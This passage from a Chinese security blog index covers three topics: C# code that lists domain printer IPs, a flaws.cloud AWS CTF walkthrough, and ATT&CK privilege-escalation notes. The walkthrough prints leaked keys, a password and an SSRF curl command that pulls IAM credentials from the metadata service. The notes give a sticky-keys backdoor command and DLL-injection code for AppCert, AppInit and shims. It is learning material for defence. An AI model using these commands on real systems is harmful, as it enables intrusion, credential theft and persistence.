srvErr);\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tresult.error(err);\n\t\t\t}\n\t\t}\n\t}\n}\n```\n\n"},{"title":"CSharp_获取域内打印机IP地址","url":"/2020/12-18-CSharp_获取域内打印机IP地址/","content":"​\t在对公司内部的硬件系统做测试时想收集一下域内所有打印机的信息，网上没找到相关的代码，然后写了个脚本，获取域内所有打印机真实的IP地址：\n\n```c#\nusing System;\nusing System.DirectoryServices;\nusing System.Text.RegularExpressions;\n\nnamespace GetPrinter\n{\n    class Program\n    {\n        private static DirectoryEntry entryOU;\n\n        public static void GetPrinter()\n        {\n            // 创建DirectorySearcher对象\n            DirectorySearcher mySearcher = new DirectorySearcher(entryOU, \"(objectCategory=printQueue)\");\n            //获取结果集合\n            SearchResultCollection searchResult = mySearcher.FindAll();\n            Console.WriteLine(\"Printer Number :\"+ searchResult.Count);\n\n            foreach (SearchResult user in searchResult)\n            {\n                DirectoryEntry directoryEntry = user.GetDirectoryEntry();\n                string printerName = directoryEntry.Name;\n\n                //获取打印机的各种属性\n                ResultPropertyCollection myResultPropColl;\n                myResultPropColl = user.Properties;\n                foreach (string myKey in myResultPropColl.PropertyNames)\n                {\n                    if (myKey == \"portname\")\n                    {\n                        foreach (Object myCollection in myResultPropColl[myKey])\n                        {\n                            Regex regex = new Regex(@\"\\d\\d\\.\");\n                            MatchCollection matchs1 = regex.Matches((string)myCollection);\n                            if (matchs1.Count > 0)\n                            {\n                                Console.WriteLine(\"---------------------------------------\");\n                                //打印机服务器名称+型号\n                                Console.WriteLine(printerName);\n                                //打印机的真实IP\n                                Console.WriteLine(\"IP Addr : \" + myCollection);\n                            }\n                        }\n                    }\n                }\n            }\n        }\n        static void Main(string[] args)\n        {\n            GetPrinter();\n            Console.ReadKey();\n        }\n    }\n}\n```\n\n运行结果（码打的比较厚）：\n\n![image-20200805203819611](CSharp_获取域内打印机IP地址.assets/image-20200805203819611.png)\n\n","categories":["RedTeam&域安全"]},{"title":"AWS_CTF","url":"/2020/12-18-AWS_CTF/","content":"\n# AWS CTF\n\n[http://flaws.cloud](http://flaws.cloud/) 是在网上找的一个AWS的CTF网站，适合入门AWS安全的同学，然后跟着学习了一下：\n\n## level 1 练习如何访问存储桶\n\n![image-20200819151320108](AWS_CTF.assets/image-20200819151320108.png)\n\n![image-20200819151426002](AWS_CTF.assets/image-20200819151426002.png)\n\nS3存储桶的位置\n\n```\n对于每个托管在S3存储桶中的网站，都会被分配一个AWS的域名，而不需要你自己额外配置DNS。所以，flaws.cloud加上它的S3地址：http://flaws.cloud.s3-website-us-west-2.amazonaws.com/ ，也能访问到主页。\n```\n\n![image-20200819151534807](AWS_CTF.assets/image-20200819151534807.png)\n\n上述的步骤得到的信息：\n\n```\n1、flaws.cloud是一个存储在S3中的静态网站\n2、地区位于us-west-2\n3、对于S3存储桶上HTTP端点的URL遵循固定格式：s3-<region>.amazonaws.com/<bucketname>，所以flaws.cloud的S3端点为http://s3-us-west-2.amazonaws.com/flaws.cloud\n```\n\n访问上面信息3的地址：\n\n```xml\nThis XML file does not appear to have any style information associated with it. The document tree is shown below.\n<ListBucketResult xmlns=\"http://s3.amazonaws.com/doc/2006-03-01/\">\n<Name>flaws.cloud</Name>\n<Prefix/>\n<Marker/>\n<MaxKeys>1000</MaxKeys>\n<IsTruncated>false</IsTruncated>\n<Contents>\n<Key>hint1.html</Key>\n<LastModified>2017-03-14T03:00:38.000Z</LastModified>\n<ETag>\"f32e6fbab70a118cf4e2dc03fd71c59d\"</ETag>\n<Size>2575</Size>\n<StorageClass>STANDARD</StorageClass>\n</Contents>\n<Contents>\n<Key>hint2.html</Key>\n<LastModified>2017-03-03T04:05:17.000Z</LastModified>\n<ETag>\"565f14ec1dce259789eb919ead471ab9\"</ETag>\n<Size>1707</Size>\n<StorageClass>STANDARD</StorageClass>\n</Contents>\n<Contents>\n<Key>hint3.html</Key>\n<LastModified>2017-03-03T04:05:11.000Z</LastModified>\n<ETag>\"ffe5dc34663f83aedaffa512bec04989\"</ETag>\n<Size>1101</Size>\n<StorageClass>STANDARD</StorageClass>\n</Contents>\n<Contents>\n<Key>index.html</Key>\n<LastModified>2020-05-22T18:16:45.000Z</LastModified>\n<ETag>\"f01189cce6aed3d3e7f839da3af7000e\"</ETag>\n<Size>3162</Size>\n<StorageClass>STANDARD</StorageClass>\n</Contents>\n<Contents>\n<Key>logo.png</Key>\n<LastModified>2018-07-10T16:47:16.000Z</LastModified>\n<ETag>\"0623bdd28190d0583ef58379f94c2217\"</ETag>\n<Size>15979</Size>\n<StorageClass>STANDARD</StorageClass>\n</Contents>\n<Contents>\n<Key>robots.txt</Key>\n<LastModified>2017-02-27T01:59:28.000Z</LastModified>\n<ETag>\"9e6836f2de6d6e6691c78a1902bf9156\"</ETag>\n<Size>46</Size>\n<StorageClass>STANDARD</StorageClass>\n</Contents>\n<Contents>\n<Key>secret-dd02c7c.html</Key><!-- 这里是level2的内容 -->\n<LastModified>2017-02-27T01:59:30.000Z</LastModified>\n<ETag>\"c5e83d744b4736664ac8375d4464ed4c\"</ETag>\n<Size>1051</Size>\n<StorageClass>STANDARD</StorageClass>\n</Contents>\n</ListBucketResult>\n```\n\n直接把Key的内容加在后面，得到level2的地址：http://s3-us-west-2.amazonaws.com/flaws.cloud/secret-dd02c7c.html\n\n![image-20200819162812197](AWS_CTF.assets/image-20200819162812197.png)\n\n## level 2\n\n使用AWS客户端绑定AK和SAK：\n\n![image-20200826165621655](AWS_CTF.assets/image-20200826165621655.png)\n\n然后使用命令列出S3桶中的文件：\n\n```powershell\naws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud --region us-west-2 --recursive\n```\n\n![image-20200826165900484](AWS_CTF.assets/image-20200826165900484.png)\n\n将secret-e4443fc.html加在后面组成URL：\n\n```\nhttp://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html\n```\n\n![image-20200826170133794](AWS_CTF.assets/image-20200826170133794.png)\n\n## level 3\n\n首先使用命令查看第三关的存储桶：\n\n```\naws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud --recursive\n```\n\n![image-20200826171915564](AWS_CTF.assets/image-20200826171915564.png)\n\n有很多文件，和.git目录，使用命令下载下来：\n\n```\naws s3 cp s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud ./testtest --recursive\n```\n\n![image-20200826172514150](AWS_CTF.assets/image-20200826172514150.png)\n\n查看git log:\n\n![image-20200826172727008](AWS_CTF.assets/image-20200826172727008.png)\n\n检查提交记录：\n\n```\ngit checkout f52ec03b227ea6094b04e43f475fb0126edb5a61\n```\n\n![image-20200826173031158](AWS_CTF.assets/image-20200826173031158.png)\n\n然后看到当前目录下生成了一个access_keys.txt文件\n\n![image-20200826173057975](AWS_CTF.assets/image-20200826173057975.png)\n\n内容为：\n\n```\naccess_key AKIAJ366LIPB4IJKT7SA\nsecret_access_key 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\n```\n\n使用这两个AK和SAK配置客户端：\n\n```\naws configure --profile flaws\n//这个命令是看当前的账号存储桶里的内容的\n```\n\n![image-20200826173335167](AWS_CTF.assets/image-20200826173335167.png)\n\n这里直接获取了后面所有关卡的地址\n\n```\nlevel2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud\nlevel3-9afd3927f195e10225021a578e6f78df.flaws.cloud\nlevel4-1156739cfb264ced6de514971a4bef68.flaws.cloud\nlevel5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud\nlevel6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud\ntheend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud\n```\n\n### 问题点\n\n```\n在将项目上传到S3存储桶，没有做权限校验？，任何人都可以下载，在git上传项目时第一次把账号密码上传上去了，然后重新传的时候没有将分支的内容删除\n\n思路：\n首先查看存储桶里的内容---->发现存在.git---->下载下来查看git的历史记录---->通过提示得知有一次提交存在不该提交的内容---->通过git checkout恢复工作树文件---->获得AK和SAK---->通关\n```\n\n## level 4 快照创建EC2\n\n直接根据上一级获取到的level4的地址进入：`level4-1156739cfb264ced6de514971a4bef68.flaws.cloud`，但是需要认证\n\nhttp://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/\n\n![image-20200826175335565](AWS_CTF.assets/image-20200826175335565.png)\n\n### 根据快照创建实例\n\n根据提示1使用命令获取呼叫者的身份（需要是IAM用户）：\n\n```powershell\naws --profile flaws sts get-caller-identity\n```\n\n![image-20200826175500456](AWS_CTF.assets/image-20200826175500456.png)\n\n```powershell\naws --profile flaws ec2 describe-snapshots --owner-id 975426262029\n# 根据ownerid查看describe-snapshots\n```\n\n![image-20200826175548736](AWS_CTF.assets/image-20200826175548736.png)\n\n查看快照的权限：\n\n```\naws ec2 describe-snapshot-attribute --snapshot-id snap-0b49342abd1bdcb89 --attribute createVolumePermission --profile flaws\n```\n\n![image-20200826191814711](AWS_CTF.assets/image-20200826191814711.png)\n\n用自己的账号登陆，然后根据这个快照创建一个EC2的卷，这里卷的availability-zone要设置和实例一样的，要不然会无法关联\n\n```\naws ec2 create-volume --region us-west-2 --availability-zone us-west-2c --snapshot-id snap-0b49342abd1bdcb89\n```\n\n![image-20200827105229257](AWS_CTF.assets/image-20200827105229257.png)\n\n这里要记的一个内容是卷ID（图片的那个删除了，又重新创建了一个）\n\n```\nvol-0642240204d119957\n```\n\n![image-20200827105348763](AWS_CTF.assets/image-20200827105348763.png)\n\n开启(就是创建)一个免费的EC2实例\n\n```\naws ec2 describe-instances//这个命令只是展示实例\n```\n\n![image-20200827131754575](AWS_CTF.assets/image-20200827131754575.png)\n\n这里创建时会自动新创建一个卷，如果想绑定其他卷需要先断开卷和实例的链接，然后再绑定CTF这个卷\n\n将卷和实例绑定（要注意需要在一个可用区里，这里都是在us-west-2c）：\n\n```\naws ec2 attach-volume --volume-id vol-0642240204d119957 --instance-id i-0605c67ef512556a2 --device /dev/sdf\n```\n\n![image-20200827131915834](AWS_CTF.assets/image-20200827131915834.png)\n\n使用Xshell连接AWS，用户名需要使用ubuntu，否则会报错\n\n![image-20200827132038887](AWS_CTF.assets/image-20200827132038887.png)\n\n也可以直接使用命令（这里是使用的xshell登录的）：\n\n```\nssh -i \"ctf-key.pem\" ubuntu@ec2-54-201-167-24.us-west-2.compute.amazonaws.com\n```\n\n![image-20200827134949657](AWS_CTF.assets/image-20200827134949657.png)\n\n### 连接实例之后查找密码\n\n```bash\nlsblk\nlsblk命令用于列出所有可用块设备的信息，而且还能显示他们之间的依赖关系\n```\n\n![image-20200827135743834](AWS_CTF.assets/image-20200827135743834.png)\n\n```bash\nsudo mkdir /mnt/flaws\nsudo mount /dev/xvdf1 /mnt/flaws\nmount\nLinux mount命令用于挂载Linux系统外的文件。\n```\n\n![image-20200827135825685](AWS_CTF.assets/image-20200827135825685.png)\n\n```\nls -l /mnt/flaws\n```\n\n![image-20200827135904540](AWS_CTF.assets/image-20200827135904540.png)\n\n```\n根据提示中的ngnix查看：\ncd /mnt/flaws/etc/nginx/\nls -al\n\ncat .htpasswd\nls /mnt/flaws/home/ubuntu/\ncat /mnt/flaws/home/ubuntu/setupNginx.sh\n```\n\n![image-20200827135939150](AWS_CTF.assets/image-20200827135939150.png)\n\n使用账号`flaws` 密码 `nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M`登录成功\n\n![image-20200827143507615](AWS_CTF.assets/image-20200827143507615.png)\n\n### 问题点和思路\n\n```\n快照未授权访问？能够直接根据快照创建实例?\n\n前提：\n当前控制的用户需要能够访问快照\n\n首先需要能够访问到快照，如果访问不到快照则不行----->根据快照绑定实例------>登录实例，就可以访问了\n```\n\n## level 5 SSRF\n\n这一关的目的是列出level 6的存储桶的内容，同时考察元数据的问题\n\n![image-20200827151647768](AWS_CTF.assets/image-20200827151647768.png)\n\n这里可以看到，有一个代理功能可以使用\n\nhttp://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/\n\n访问上面的地址回显为`flaws.cloud`的内容\n\n### 实例元数据\n\n```\n实例元数据是有关您的实例的数据，可用于配置或管理正在运行的实例。实例元数据分为几类，例如，主机名，事件和安全组。\n```\n\n![image-20200827145810310](AWS_CTF.assets/image-20200827145810310.png)\n\n```\n169.254.169.254\n\nIP地址169.254.169.254是云服务中的一个神奇IP，AWS、Azure、谷歌、DigitalOcean等公司都使用它来查找自身的元数据。对于谷歌，对请求有额外的约束，比如要求它使用Metadata-Flavor: Google作为HTTP头，拒绝带有x - forwarding - for头的请求，而在AWS中并没有约束。如果攻击者可以从EC2向该IP发出任何类型的HTTP请求，就很有可能获取到一些敏感信息。这里提供hackerone平台上两篇公开披露的报告用以参考学习：https://hackerone.com/reports/53088 、https://hackerone.com/reports/53004。\n\nhttps://qastack.cn/server/427018/what-is-this-ip-address-169-254-169-254\n\nAWS的资料\nhttps://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html\n链接本地地址\nhttps://en.wikipedia.org/wiki/Link-local_address\nhttps://tools.ietf.org/html/rfc3927\n```\n\n检查历史命令：\n\n```\ncd /mnt/flaws/home/ubuntu/\ncat .bash_history\n```\n\n看到记录：\n\n![image-20200827151510694](AWS_CTF.assets/image-20200827151510694.png)\n\n直接访问这个地址是访问不了的：\n\n![image-20200827152023772](AWS_CTF.assets/image-20200827152023772.png)\n\n尝试通过EC2的代理访问\n\n```\ncurl  http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/info\n```\n\n![image-20200827152135058](AWS_CTF.assets/image-20200827152135058.png)\n\n可以看到返回了一个json的内容，没有秘钥，可以看到上面的历史记录里有一个：\n\n```\nwget http://169.254.169.254/iam/security-credentials/flaws\n```\n\n### 获取AK、SK\n\n尝试通过代理访问：\n\n```\ncurl http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/\n```\n\n![image-20200827152512340](AWS_CTF.assets/image-20200827152512340.png)\n\n这里就获取了一个AK和SAK\n\n```json\n{\n  \"Code\" : \"Success\",\n  \"LastUpdated\" : \"2020-08-27T06:48:25Z\",\n  \"Type\" : \"AWS-HMAC\",\n  \"AccessKeyId\" : \"ASIA6GG7PSQGZGH5CZXW\",\n  \"SecretAccessKey\" : \"GqfddXDTtitUDLGl+VHhx8iXU9qp2knKGfuE5Wz+\",\n  \"Token\" : \"IQoJb3JpZ2luX2VjEP///////////wEaCXVzLXdlc3QtMiJIMEYCIQDlEoLtG5+78AH1h4/9+MnaexeO2++/pt8B5zAXdiY9vAIhAK/qRMGz39RBflcbHOJB1NCzk/St90c+DKzMIr9/mvvDKr0DCOj//////////wEQARoMOTc1NDI2MjYyMDI5IgzB8n7UIgIVWxenF2IqkQMVjfljmETO7swVegtyk0i1lxvtUDQUsgNTAIWzUqTHOUniGsyy99TUjG4nXbU2k4QqWZ3KInMtsqEJQO5jigctt4hUsiev2E9BWlnT7pkoDS2pF05Xv54SNUPP2xmYykE97dkK6EJE3gmiwYGhNaUti5r8yfuFBoRPugeKmJMs74/evBeLwtGvURXzdbFSbherkHecPMEDt9+WeVkBkQPJHCyqgwdCAgogWkXMaZm7o3P/JKKTslauF0tIJbL+l9FlwcmKuXix3RIYOLP5Es9HD683mlOQs21CMEh5qGRsvbg/44BvBs4eNgkgnxdi5obFEul6w2K3RBz7cqNSkHDkAgbCNUB06JavhG3CtO2YG02Rfmas6cARoi8LvN8GKG7i1/0f5U4seEccKobCXhpMoO9Vd/x+YGOOWP75Un/sAJEYbmICA9D2NTrteyDGkmgytXUDwbK0J84svSHdSIFbxcwYGpPW9p8TGQsoXwTNXkkAnYsVdTy2AfYDaPC6XBc+1N7HW3wfG+ViK5CR70X8MTDcrp36BTrqAYnHYC1dhQm+GaIV4NOtAy5uIjGVoIXco4bKoUGMWf+6CpjEwo6jzP+HBoiQfWOAhTz2ac7KgZEluVHs/0eW2HHdCJsedRRjEsJFTSw/ZPG72dAYjYdyz6REF2pCQP9NMMwpfPwyyOZ6XrUdbWhq+nUGpvjHiZfNHuP7pGAyfycQhM6T2psS7/SpBScCpVEGKM3URPAjBZ9Uh4XG0/ihb0e2EpxdPP+gpZR+ZRdYG5XHt4a0Rnoon7JnQYVP95GjRBRtoY/eoSK98y1sTgmKWNYIH4KxueZboOBEzZJr96Xa7edRAlkBTBNFsQ==\",\n  \"Expiration\" : \"2020-08-27T12:54:03Z\"\n}\n```\n\n将AK和SAK和Token写入配置文件（这里的windows的客户端）：\n\n![image-20200827153219163](AWS_CTF.assets/image-20200827153219163.png)\n\n然后获取level6的存储桶的内容\n\n```\naws --profile proxy s3 ls s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud\n```\n\n![image-20200827153606248](AWS_CTF.assets/image-20200827153606248.png)\n\n获取隐藏路径`ddcc78ff`，访问`http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/`进入level6\n\n![image-20200827153755299](AWS_CTF.assets/image-20200827153755299.png)\n\n### 问题点和思路\n\n这里将环境配置为一个proxy参数接收一个URL，模拟SSRF的漏洞，然后通过SSRF查看实例元数据的内容，从而获得了AK和SK\n\n可以参考：https://blog.appsecco.com/server-side-request-forgery-ssrf-and-aws-ec2-instances-after-instance-meta-data-service-version-38fc1ba1a28a\n\n修复方式：https://duo.com/decipher/aws-adds-new-protections-against-ssrf-other-web-app-attacks\n\n## level 6 安全策略和Lambad\n\n### AK和SAK的泄露\n\n首先给了一个AK和SAK\n\n![image-20200827164757163](AWS_CTF.assets/image-20200827164757163.png)\n\n将凭据配置到`\\.aws\\credentials`文件中：\n\n![image-20200827165743296](AWS_CTF.assets/image-20200827165743296.png)\n\n```powershell\naws --profile level6 iam get-user\n# 查看当前用户\n```\n\n![image-20200827165000684](AWS_CTF.assets/image-20200827165000684.png)\n\n### 查看策略\n\n```powershell\naws --profile level6 iam list-attached-user-policies --user-name Level6\n# list-attached-user-policies :列出附加到指定IAM用户的所有策略\n```\n\n![image-20200827165032638](AWS_CTF.assets/image-20200827165032638.png)\n\n```powershell\naws --profile level6 iam get-policy --policy-arn arn:aws:iam::975426262029:policy/list_apigateways\n# 查看ARN为arn:aws:iam::975426262029:policy/list_apigateways的策略简略信息\n```\n\n![image-20200827165053567](AWS_CTF.assets/image-20200827165053567.png)\n\n```powershell\naws --profile level6 iam get-policy-version  --policy-arn arn:aws:iam::975426262029:policy/list_apigateways --version-id v4\n# 检索有关指定托管策略的指定版本的信息，包括策略文档\n```\n\n![image-20200827165120334](AWS_CTF.assets/image-20200827165120334.png)\n\n```powershell\naws --region us-west-2 --profile level6 lambda list-functions\n# 安全客上的说是因为apigateway比较多的会和lambda放在一起使用，所以这里用语句查看一下当前账户的lambda函数\n```\n\n![image-20200827165133929](AWS_CTF.assets/image-20200827165133929.png)\n\n```powershell\naws --region us-west-2 --profile level6 lambda get-policy --function-name Level6\n# 查看函数名为Level6的策略\n```\n\n![image-20200827165222188](AWS_CTF.assets/image-20200827165222188.png)\n\n```json\n{\n    \"Policy\": \"\n    {\n    \t\\\"Version\\\":\\\"2012-10-17\\\",\n\t\t\\\"Id\\\":\\\"default\\\",\n\t\t\\\"Statement\\\":[\n\t\t{\n    \t\t\\\"Sid\\\":\\\"904610a93f593b76ad66ed6ed82c0a8b\\\",\n    \t\t\\\"Effect\\\":\\\"Allow\\\",\n\t\t\t\\\"Principal\\\":{\\\"Service\\\":\\\"apigateway.amazonaws.com\\\"},\n\t\t\t\\\"Action\\\":\\\"lambda:InvokeFunction\\\",\n\t\t\t\\\"Resource\\\":\\\"arn:aws:lambda:us-west-2:975426262029:function:Level6\\\",\n\t\t\t\\\"Condition\\\":\n\t\t\t{\n\t\t\t\t\\\"ArnLike\\\":\n\t\t\t\t{\\\"AWS:SourceArn\\\":\\\"arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\\\"}\n\t\t\t}\n\t\t}]\n\t}\",\n    \"RevisionId\": \"98033dfd-defa-41a8-b820-1f20add9c77b\"\n}\n```\n\n从上面的JSON看到这个函数的SourceArn为`arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\\`，其中`s33ppypa75`表示`rest-api-id`\n\n```powershell\naws --profile level6 --region us-west-2 apigateway get-stages --rest-api-id \"s33ppypa75\"\n# 获取有关一个或多个resources的信息?\n```\n\n![image-20200827165551492](AWS_CTF.assets/image-20200827165551492.png)\n\nAWS的资源端点规则：`https://<rest-api-id>.execute-api.<region>.amazonaws.com/<stage-name>/<lambda function>`，根据上面的信息拼接的URL为：`https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6`,这里最后的函数名要写成小写，写成大写访问不到\n\n![image-20200827172419144](AWS_CTF.assets/image-20200827172419144.png)\n\n访问得到最终的链接\n\n![image-20200827172502685](AWS_CTF.assets/image-20200827172502685.png)\n\n### 问题点和思路\n\n这一题主要是考察lambda和API的使用\n\n思路：\n\n```\n首先根据当前凭据获取用户名、USERID等信息-------->查看当前用户IAM中的所有策略------------->根据apigateway联想到lambda(apigateway常用来调用管理lambda)----------->根据lambda策略获取rest-api-id名称和stage-name-------->组成lambda的调用链接，访问之后得到通关的链接\n```\n","categories":["大数据/云/容器"]},{"title":"ATT&CK_Privilege Escalation","url":"/2020/12-18-ATT&CK_Privilege Escalation/","content":"\n## 未完成Access Token Manipulation-T1134\n\n令牌操作的一种技术是使用从另一个进程“窃取”的令牌创建一个新进程。这是当受害者主机上正在运行的进程之一中存在的已经存在的访问令牌的令牌被检索，复制然后用于创建新进程时，使新进程承担该被盗令牌的特权。windows中还有一些相关的API：\n\n```\nOpenProcess\t\t使用想要窃取的访问令牌打开一个进程\nOpenProcesToken\t获取该进程的访问令牌的句柄\nDuplicateTokenEx\t复制进程中存在的访问令牌\nCreateProcessWithTokenW\t使用新获取的访问令牌创建新流程\n```\n\n可参考https://docs.microsoft.com/en-us/windows/win32/api/\n\n前提说明必须要有管理员权限才能进行这种方式的利用。\n\nRunas命令可以在使用用户名密码的情况下执行命令\n\nRunas /noprofile /user:s1\\administrator cmd\n\n![1574922678647](Privilege_Escalation.assets/1574922678647.png)\n\n还有Invoke-RunAs(Empire中的)\n\n## Accessibility Features-T1015\n\nAccessibility Features同时被归类为Persistence和Privilege Escalation，但是个人觉得更适合归类为Persistence一章，因为主要的作用还是维持权限。\n\nWindows包含可访问性功能，这些功能可以在用户登录之前（例如，当用户在Windows登录屏幕上时）通过组合键启动。攻击者可以修改这些程序的启动方式，以获取命令提示符或后门程序，而无需登录系统。比如shift后门，通过五次shift按键调用C:\\Windows\\System32\\sethc.exe。\n\n通过命令修改sethc文件为cmd文件。\n\n```\ncopy c:\\windows\\system32\\cmd.exe c:\\windows\\system32\\sethc.exe\n```\n\n![1574767433351](Privilege_Escalation.assets/1574767433351.png)\n\n实际上也可以通过注册表来进行操作，只修改注册表，不替换实际文件：\n\n```\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /t REG_SZ /v Debugger /d “C:\\windows\\system32\\cmd.exe” /f\n```\n\n在桌面锁定的时候按下五次shift即可在没有进入桌面的情况下调用cmd\n\n![1574767481596](Privilege_Escalation.assets/1574767481596.png)\n\n```\n其他类似的功能还有\n屏幕键盘： C:\\Windows\\System32\\osk.exe\n放大镜： C:\\Windows\\System32\\Magnify.exe\n旁白： C:\\Windows\\System32\\Narrator.exe\n显示切换器： C:\\Windows\\System32\\DisplaySwitch.exe\nApp切换器： C:\\Windows\\System32\\AtBroker.exe\n```\n\n## AppCert DLL-T1182\n\n如果有进程使用了CreateProcess、CreateProcessAsUser、CreateProcessWithLoginW、CreateProcessWithTokenW或WinExec函数，那么此进程会读取注册表项：\n\n```\nHKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\SessionManager\\AppCertDlls\n```\n\n此项下的dll都会加载到此进程。（Win7下默认没有此项）\n\n![1574767636462](Privilege_Escalation.assets/1574767636462.png)\n\n首先创建这个注册表项\n\n![1574767651518](Privilege_Escalation.assets/1574767651518.png)\n\n指向一个DLL文件，这个DLL文件会使用MessageBox弹出一个对话框，C++代码为：\n\n```c++\n// mydll.cpp : Defines the entry point for the DLL application.\n//\n#!c\n#include \"stdafx.h\"\n#include \"Windows.h\"\nBOOL APIENTRY DllMain( HANDLE hModule, \n                       DWORD  ul_reason_for_call, \n                       LPVOID lpReserved\n\t\t\t\t\t )\n{\n\tMessageBox(NULL, \"testAppCert DLLs\", \"attack\", MB_OK| MB_ICONEXCLAMATION);\n    return TRUE;\n}\n```\n\n然后创建一个程序，使用CreateProcess创建进程，这里的代码含义为使用CreateProcess执行一个cmd命令，代码为（这里是直接使用的MSDN上给出的示例https://docs.microsoft.com/zh-cn/windows/win32/procthread/creating-processes）：\n\n```c++\n#include <windows.h>\n#include <stdio.h>\n#include <tchar.h>\n\nvoid _tmain( int argc, TCHAR *argv[] )\n{\n    STARTUPINFO si;\n    PROCESS_INFORMATION pi;\n    ZeroMemory( &si, sizeof(si) );\n    si.cb = sizeof(si);\n    ZeroMemory( &pi, sizeof(pi) );\n    if( argc != 2 )\n    {\n        printf(\"Usage: %s [cmdline]\\n\", argv[0]);\n        return;\n    }\n    // Start the child process. \n    if( !CreateProcess( NULL,   // No module name (use command line)\n        argv[1],        // Command line\n        NULL,           // Process handle not inheritable\n        NULL,           // Thread handle not inheritable\n        FALSE,          // Set handle inheritance to FALSE\n        0,              // No creation flags\n        NULL,           // Use parent's environment block\n        NULL,           // Use parent's starting directory \n        &si,            // Pointer to STARTUPINFO structure\n        &pi )           // Pointer to PROCESS_INFORMATION structure\n    ) \n    {\n        printf( \"CreateProcess failed (%d).\\n\", GetLastError() );\n        return;\n    }\n    // Wait until child process exits.\n    WaitForSingleObject( pi.hProcess, INFINITE );\n    // Close process and thread handles. \n    CloseHandle( pi.hProcess );\n    CloseHandle( pi.hThread );\n}\n```\n\n此时编译出了两个文件，一个exe，一个DLL\n\n![1574767762498](Privilege_Escalation.assets/1574767762498.png)\n\n执行TestCreateProcess.exe运行calc.exe（此时），可以看到dll已经被调用：\n\n![1574767845396](Privilege_Escalation.assets/1574767845396.png)\n\n## AppInit DLLs-T1103\n\n当User32.dll被调用时，会获取AppInit DLLs注册表项，如果有值，则会通过LoadLibrary()API加载，不使用User32.dll的程序是不需要加载这个注册表项的。（https://support.microsoft.com/en-us/help/197571/working-with-the-appinit-dlls-registry-value）\n\n注册表位置：\n\n```\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\n```\n\n![1574853484727](Privilege_Escalation.assets/1574853484727.png)\n\n使用和上一个AppCert相同的dll，也就是mydll.dll，同时LoadAPPInit_DLLS需要设置为1。\n\n![1574853497124](Privilege_Escalation.assets/1574853497124.png)\n\n这个在设置完了发现需要重启之后才能生效，重启之后发现开机自动被调用（忽略MessageBox中的名称，这里用的是AppCert Dlls实验中的dll）\n\n![1574853537829](Privilege_Escalation.assets/1574853537829.png)\n\n通过Process Explorer可以看到Chrome浏览器和搜狗拼音输入法都会自动调用User32.dll从而加载AppInit DLLs注册表中的c:\\mydll.dll\n\n![1574853575466](Privilege_Escalation.assets/1574853575466.png)\n\n同时cmd.exe也会调用User32.dll。是一个需要重点关注的注册表项。需要检测AppInit DLLs注册表动态，是否存在被修改的情况，同时可以通过APPLocker进行设置白名单，禁止通过AppInit DLLs调用dll。\n\n## Application Shimming-T1138\n\nShims可用于在较新的环境中支持旧API，或在旧环境中支持新API。在计算机编程，一个Shims是一个小型数据库，是透明的拦截API调用和改变传递的参数，处理操作本身或把操作重定向到其他地方。\n\n例如，Application Shimming应用程序允许开发人员将为WindowsXP创建的应用程序所写的修复在无需重写代码的情况下用于Win10。\n\n​    Shim架构实现了一种API钩子，而windows API是通过一组DLL来实现的，windows系统上的每个应用程序导入这些DLL，并在内存中维护一个存储调用函数地址的表。\n\n我们可以通过sdbinst工具将自定义的sdb数据库文件部署到计算机中，部署并注册数据库文件之后操作系统会在启动应用程序时启用兼容性修补程序。\n\n首先生成了一个DLL文件用于测试，代码和APPCertdlls的一样，通过MessageBox弹一个窗。然后安装ApplicationCompatibilityToolkit工具（可参考https://support.microsoft.com/en-us/help/317510/how-to-use-the-compatibility-administrator-utility-in-windows），安装完成后通过命令行打开：\n\n![1574853661528](Privilege_Escalation.assets/1574853661528.png)\n\n打开之后创建fix：\n\n![1574854033613](Privilege_Escalation.assets/1574854033613.png)\n\n选择InjectDll：\n\n![1574854044950](Privilege_Escalation.assets/1574854044950.png)\n\n设置希望被加载的dll路径：\n\n![1574854066800](Privilege_Escalation.assets/1574854066800.png)\n\n然后确定下一步完成：\n\n![1574854077679](Privilege_Escalation.assets/1574854077679.png)\n\n现在保存这个数据库名称：\n\n![1574854087986](Privilege_Escalation.assets/1574854087986.png)\n\n保存之后会产生一个名为testShim.sdb的文件，此时执行还需要将sdb安装到系统的Shim库中\n\n![1574854099518](Privilege_Escalation.assets/1574854099518.png)\n\n可以通过ApplicationCompatibilityToolkit直接安装，也可以通过sdbinst.exe进行安装（系统自带，可以直接运行）\n\n![1574854143247](Privilege_Escalation.assets/1574854143247.png)\n\n![1574854148771](Privilege_Escalation.assets/1574854148771.png)\n\n安装完成之后可以看到已经安装的testShim：\n\n![1574854159357](Privilege_Escalation.assets/1574854159357.png)\n\n此时运行putty时dll被加载：\n\n![1574854180686](Privilege_Escalation.assets/1574854180686.png)\n\n需要卸载的话也可以使用sdbinst.exe进行卸载：\n\n![1574854193712](Privilege_Escalation.assets/1574854193712.png)\n\n**防